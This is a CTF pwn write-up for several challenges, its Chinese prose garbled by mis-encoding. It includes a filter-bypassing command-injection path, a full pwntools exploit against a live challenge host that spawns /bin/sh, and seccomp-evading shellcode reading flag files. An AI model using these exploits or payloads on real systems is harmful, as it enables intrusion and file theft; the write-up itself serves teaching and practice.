<p>popen()ÂáΩÊï∞ÈÄöËøáÂàõÂª∫‰∏Ä‰∏™ÁÆ°ÈÅìÔºåË∞ÉÁî®fork()‰∫ßÁîü‰∏Ä‰∏™Â≠êËøõÁ®ãÔºåÊâßË°å‰∏Ä‰∏™shell‰ª•ËøêË°åÂëΩ‰ª§Êù•ÂºÄÂêØ‰∏Ä‰∏™ËøõÁ®ã„ÄÇËøô‰∏™ÁÆ°ÈÅìÂøÖÈ°ªÁî±pclose()ÂáΩÊï∞ÂÖ≥Èó≠ÔºåËÄå‰∏çÊòØfclose()ÂáΩÊï∞„ÄÇpclose()ÂáΩÊï∞ÂÖ≥Èó≠Ê†áÂáÜI&#x2F;OÊµÅÔºåÁ≠âÂæÖÂëΩ‰ª§ÊâßË°åÁªìÊùüÔºåÁÑ∂ÂêéËøîÂõûshellÁöÑÁªàÊ≠¢Áä∂ÊÄÅ„ÄÇÂ¶ÇÊûúshell‰∏çËÉΩË¢´ÊâßË°åÔºåÂàôpclose()ËøîÂõûÁöÑÁªàÊ≠¢Áä∂ÊÄÅ‰∏éshellÂ∑≤ÊâßË°åexit‰∏ÄÊ†∑„ÄÇ<br>typeÂèÇÊï∞Âè™ËÉΩÊòØËØªÊàñËÄÖÂÜô‰∏≠ÁöÑ‰∏ÄÁßçÔºåÂæóÂà∞ÁöÑËøîÂõûÂÄºÔºàÊ†áÂáÜI&#x2F;OÊµÅÔºâ‰πüÂÖ∑ÊúâÂíåtypeÁõ∏Â∫îÁöÑÂè™ËØªÊàñÂè™ÂÜôÁ±ªÂûã„ÄÇÂ¶ÇÊûútypeÊòØ‚Äùr‚ÄùÂàôÊñá‰ª∂ÊåáÈíàËøûÊé•Âà∞commandÁöÑÊ†áÂáÜËæìÂá∫ÔºõÂ¶ÇÊûútypeÊòØ‚Äùw‚ÄùÂàôÊñá‰ª∂ÊåáÈíàËøûÊé•Âà∞commandÁöÑÊ†áÂáÜËæìÂÖ•„ÄÇ<br>commandÂèÇÊï∞ÊòØ‰∏Ä‰∏™ÊåáÂêë‰ª•NULLÁªìÊùüÁöÑshellÂëΩ‰ª§Â≠óÁ¨¶‰∏≤ÁöÑÊåáÈíà„ÄÇËøôË°åÂëΩ‰ª§Â∞ÜË¢´‰º†Âà∞bin&#x2F;shÂπ∂‰ΩøÁî®-cÊ†áÂøóÔºåshellÂ∞ÜÊâßË°åËøô‰∏™ÂëΩ‰ª§„ÄÇ<br>popen()ÁöÑËøîÂõûÂÄºÊòØ‰∏™Ê†áÂáÜI&#x2F;OÊµÅÔºåÂøÖÈ°ªÁî±pcloseÊù•ÁªàÊ≠¢„ÄÇÂâçÈù¢ÊèêÂà∞Ëøô‰∏™ÊµÅÊòØÂçïÂêëÁöÑÔºàÂè™ËÉΩÁî®‰∫éËØªÊàñÂÜôÔºâ„ÄÇÂêëËøô‰∏™ÊµÅÂÜôÂÜÖÂÆπÁõ∏ÂΩì‰∫éÂÜôÂÖ•ËØ•ÂëΩ‰ª§ÁöÑÊ†áÂáÜËæìÂÖ•ÔºåÂëΩ‰ª§ÁöÑÊ†áÂáÜËæìÂá∫ÂíåË∞ÉÁî®popen()ÁöÑËøõÁ®ãÁõ∏ÂêåÔºõ‰∏é‰πãÁõ∏ÂèçÁöÑÔºå‰ªéÊµÅ‰∏≠ËØªÊï∞ÊçÆÁõ∏ÂΩì‰∫éËØªÂèñÂëΩ‰ª§ÁöÑÊ†áÂáÜËæìÂá∫ÔºåÂëΩ‰ª§ÁöÑÊ†áÂáÜËæìÂÖ•ÂíåË∞ÉÁî®popen()ÁöÑËøõÁ®ãÁõ∏Âêå„ÄÇ</p>
</blockquote>
<p>ÂáΩÊï∞‰ΩúÁî®Ôºö</p>
<blockquote>
<p>popenÂáΩÊï∞ÂÖÅËÆ∏‰∏Ä‰∏™Á®ãÂ∫èÂ∞ÜÂè¶Â§ñ‰∏Ä‰∏™Á®ãÂ∫è‰Ωú‰∏∫Êñ∞ËøõÁ®ãÊù•ÂêØÂä®ÔºåÂπ∂ÂèØ‰ª•‰º†ÈÄíÊï∞ÊçÆÊàñËÄÖÈÄöËøáÂÆÉÊé•ÂèóÊï∞ÊçÆ„ÄÇ<br>ÂÖ∂ÂÜÖÈÉ®ÂÆûÁé∞‰∏∫Ë∞ÉÁî® fork ‰∫ßÁîü‰∏Ä‰∏™Â≠êËøõÁ®ãÔºåÊâßË°å‰∏Ä‰∏™ shellÔºå ‰ª•ËøêË°åÂëΩ‰ª§Êù•ÂºÄÂêØ‰∏Ä‰∏™ËøõÁ®ãÔºåËøô‰∏™ËøõÁ®ãÂøÖÈ°ªÁî± pclose() ÂáΩÊï∞ÂÖ≥Èó≠„ÄÇ</p>
</blockquote>
<p>Ëøô‰πàËØ¥<code>popen</code>ÂáΩÊï∞Â∞±Á±ª‰ºº‰∫é<code>system</code>ÂáΩÊï∞ÂèØ‰ª•ËÆ©Êàë‰ª¨ËøõË°å‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÔºåÂèØÊòØÁ®ãÂ∫èÂØπÊàë‰ª¨ËæìÂÖ•ÁöÑË∑ØÂæÑËøòËøõË°å‰∫ÜÁ¨¨‰∫åÂ±ÇËøáÊª§</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_1F74</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> needle[<span class="number">3</span>]; <span class="comment">// [esp+15h] [ebp-13h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(needle, <span class="string">&quot;sh&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;bin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">38</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">124</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">59</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">36</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">123</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">125</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">96</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, needle) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strstr</span>(a1, v3) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != __readgsdword(<span class="number">0x14</span>u) )</span><br><span class="line">    sub_2A70();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨‰∏çËÉΩÁõ¥Êé•‰ΩøÁî®<code>/bin/sh</code>Êù•Ëµ∑shell‰∫ÜÔºåËÄå‰∏îÊàë‰ª¨‰πü‰∏çËÉΩÁõ¥Êé•<code>cat flag</code>ÔºåÂõ†‰∏∫Ëøô‰∏≠Èó¥ÊúâÁ©∫Ê†ºÔºå‰ºöÂØºËá¥Á®ãÂ∫èÂà§Êñ≠Êàë‰ª¨ÁöÑgetËØ∑Ê±ÇÊ†ºÂºèÈîôËØØÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÂÖàÂ∞Ü&#x2F;flagÁöÑÂÜÖÂÆπ‰øùÂ≠òÂà∞ÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑtmpÊñá‰ª∂‰∏≠ÔºåÁÑ∂ÂêéÂÜçËØªÂèñËØ•tmpÊñá‰ª∂Êù•Ëé∑Âèñflag<br>ËΩ¨ÁßªflagÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;cat&lt;/flag&gt;tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<p>ËØªÂèñflagÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;./tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h3><p>ËøôÈÅìÈ¢òÁõÆÊâìÁöÑÊòØ<code>C++</code>‰∏≠ÁöÑÂºÇÂ∏∏Â§ÑÁêÜÔºåÂ≠òÂú®‰∏Ä‰∏™ÂæàÊòéÊòæÁöÑÊ†àÊ∫¢Âá∫ÔºåÂèØÊòØÂºÄÂêØ‰∫Ü<code>canary</code>ÔºåÈúÄË¶ÅÁî®ÂºÇÂ∏∏Â§ÑÁêÜÊù•ÁªïËøá</p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/6.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>ËøôÈáåÊàë‰∏ÄÂºÄÂßãÊÉ≥ÁöÑÊòØÊâì <code>CHOP</code>ÔºåÂèØÊòØÈôÑ‰ª∂ÈáåÂπ∂Ê≤°ÊúâÁªôÂêÑÁßç‰æùËµñÔºåÁÑ∂ÂêéÊàëÂèëÁé∞‰∫Ü‰∏ãÈù¢Ëøô‰∏™‰∏ú‰∏ú</p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/7.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>Â•ΩÂÆ∂‰ºôÔºåËøô‰∏çÊòØÁõ¥Êé•ÈÄÅÊàë‰∏™<code>system</code>ÂáΩÊï∞Âêó„ÄÇÁªèËøáË∞ÉËØïÔºåËøô‰∏™Âú∞ÊñπÊâßË°åÊó∂<code>rdi</code>ÁöÑÂÄº‰∏ÄÁõ¥‰∏∫<code>0x4040A0</code></p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/8.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>Ëøô‰∏™Âú∞ÊñπÂ≠òÂÇ®‰∫Ü‰∏Ä‰∏™Áî®Êù•Êä•ÈîôÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊàë‰ª¨Ê≥®ÊÑèÂà∞‰∏äÈù¢Êúâ‰∏Ä‰∏™Êï∞ÁªÑÔºåËØ•Á®ãÂ∫èÂ≠òÂú®‰∏Ä‰∏™ËØ•Êï∞ÁªÑÁöÑË∂äÁïåÂÜô</p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/9.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>ÂΩìÁ¥¢Âºï‰∏∫8Êó∂Êàë‰ª¨Â∞±ËÉΩÂú®<code>0x4040A0</code>‰∏äÂÜôÊï∞ÊçÆÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÂÜô<code>/bin/sh</code>ÔºåÁÑ∂ÂêéÂà©Áî®<code>catch</code>‰∏≠ÁöÑ<code>system</code>Êù•Áõ¥Êé•getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34689</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your chocie:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">rop = <span class="number">0x404200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;You can record log details here:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Do you need to check the records?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[!] Type your message here plz:&#x27;</span>)</span><br><span class="line">payload = p64(rop+<span class="number">0x10</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p64(rop)*((<span class="number">0x70</span>//<span class="number">8</span>)-<span class="number">5</span>)+p64(rop+<span class="number">0x20</span>)+p64(<span class="number">0x401BC7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="sandbox-after-competition"><a href="#sandbox-after-competition" class="headerlink" title="sandbox(after competition)"></a>sandbox(after competition)</h3><p>ËøôÈ¢òÊòØÊúÄÊäΩË±°ÁöÑÔºåÊú¨Âú∞ÈÄöÂèØÊòØËøúÁ®ã‰∏çÈÄöüò∞üò∞üò∞üò∞üò∞üò∞<br>ÂÖ∏ÂûãÁöÑËèúÂçïÈ¢òÔºåÁî≥ËØ∑ÁöÑÂ†ÜÂùóÂ§ßÂ∞èÂè™ËÆøÈóÆ‰∫Ü<code>0x500-0x1000</code>Ôºå<code>delete</code>ÂáΩÊï∞Â≠òÂú®ÊòéÊòæÁöÑ <code>UAF</code> </p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/10.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>ÊâÄ‰ª•Áõ¥Êé•<code>larginbin attack</code>Êâì<code>_IO_list_all</code>Âç≥ÂèØÔºåÂèØÊòØËøôÂè™ÊòØÊÅ∂Ê¢¶ÁöÑÂºÄÂßãÔºåËøôÈ¢òÂºÄÂêØ‰∫ÜÊ≤ôÁÆ±</p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/11.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  

<p>ÂèØ‰ª•ÁúãÂà∞Á®ãÂ∫èÂêß<code>open</code>Âíå<code>openat</code>Áªôban‰∫ÜÔºå‰∫éÊòØÊàëÈ©¨‰∏äÊÉ≥Âà∞‰∫Ü<code>openat2</code>Ôºå<code>shellcode</code> Â¶Ç‰∏ãÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Âú®Êú¨Âú∞ÊâßË°å <code>shellcode</code> ÂêéÂèØ‰ª•È©¨‰∏äËé∑ÂèñÂà∞flagÔºåÂèØÊòØËøúÁ®ã‰∏çË°åÔºåÂΩìÊó∂ÊàëËÆ§‰∏∫Âá∫È¢òËÄÖÊääflagÁöÑÊñá‰ª∂ÂêçÁªôÊîπ‰∫ÜÔºåÊâÄ‰ª•ÊàëÂÜô‰∫Ü‰ª•‰∏ã <code>shellcode</code> Êù•Ëé∑ÂèñÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂ÂêçÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x2f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode += asm(shellcraft.getdents64(<span class="number">3</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br></pre></td></tr></table></figure>

<p>Âú®Êú¨Âú∞ÊµãËØïÊòØÊ≤°ÈóÆÈ¢òÁöÑÔºåÂèØÊòØÂà∞ËøúÁ®ãÂ∞±‰æùÁÑ∂‰ªÄ‰πàÈÉΩÊ≤°ÊúâÔºåÂêéÈù¢ÂèëÁé∞ËøúÁ®ãÁöÑ <code>kernel</code> ÁâàÊú¨ÊòØ <code>5.4</code>ÔºåËÄå <code>openat2</code> Á≥ªÁªüË∞ÉÁî®ÊòØÂú® <code>kernel 5.6</code> ÊâçÂºïÂÖ•ÁöÑÔºåÊâÄ‰ª•ËøôÁßçÊñπÊ≥ï‰ΩúÂ∫ü</p>
<p>ÁÑ∂ÂêéÊàëÊÉ≥Âà∞‰∫Ü <code>io_uring</code>ÔºåÂèØÊòØ‰æùÁÑ∂ÊòØÊú¨Âú∞ËÉΩËé∑ÂèñflagÔºåËøúÁ®ãÊó†Ê≥ïËé∑ÂèñflagÔºåÈÇ£Â§ßÊ¶ÇÁéáÂ∞±ÊòØ‰∏çÁü•ÈÅìflagÁöÑË∑ØÂæÑÂíåÊñá‰ª∂ÂêçÁöÑÈóÆÈ¢ò‰∫ÜÔºå‰∫éÊòØÊØîËµõ‰∏≠Â∞±Ê≤°ÊúâÂÅöÂá∫Êù•‚Ä¶‚Ä¶</p>
<p>ËµõÂêéÂÜçÈáçÊñ∞‰ªîÁªÜÁ†îÁ©∂‰∫Ü‰∏Ä‰∏ãÈ¢òÁõÆÔºåÂèëÁé∞ <code>seccomp</code> Á¶ÅÁî®Á≥ªÁªüË∞ÉÁî®ÁöÑÊó∂ÂÄôÂπ∂Ê≤°ÊúâÁõ¥Êé• <code>return KILL</code>ÔºåËÄåÊòØ <code>return TRACE</code>ÔºåÁÑ∂ÂêéÊàëÂú®È°πÁõÆ <code>The Linux Kernel documentation</code> ‰∏äÊâæÂà∞‰∫ÜÂØπ‰∫éËØ•ËøîÂõûÂÄºÁöÑÊèèËø∞Ôºö</p>
<blockquote>
<p>SECCOMP_RET_TRACE:<br>When returned, this value will cause the kernel to attempt to notify a ptrace()-based tracer prior to executing the system call. If there is no tracer present, -ENOSYS is returned to userland and the system call is not executed.<br>A tracer will be notified if it requests PTRACE_O_TRACESECCOMP using ptrace(PTRACE_SETOPTIONS). The tracer will be notified of a PTRACE_EVENT_SECCOMP and the SECCOMP_RET_DATA portion of the BPF program return value will be available to the tracer via PTRACE_GETEVENTMSG.<br>The tracer can skip the system call by changing the syscall number to -1. Alternatively, the tracer can change the system call requested by changing the system call to a valid syscall number. If the tracer asks to skip the system call, then the system call will appear to return the value that the tracer puts in the return value register.<br>The seccomp check will not be run again after the tracer is notified. (This means that seccomp-based sandboxes MUST NOT allow use of ptrace, even of other sandboxed processes, without extreme care; ptracers can use this mechanism to escape.)</p>
</blockquote>
